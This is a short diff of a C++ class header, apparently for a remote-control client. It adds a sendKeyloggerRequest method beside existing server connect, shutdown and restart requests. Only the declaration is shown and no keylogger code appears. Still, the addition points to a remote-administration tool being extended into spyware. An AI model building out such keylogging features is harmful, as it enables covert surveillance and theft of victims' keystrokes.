@@ -11,6 +11,7 @@ public:
     bool connectToServer();
     bool sendShutdownRequest();
     bool sendRestartRequest();
+    bool sendKeyloggerRequest();
 
 private:
     std::string serverIP;
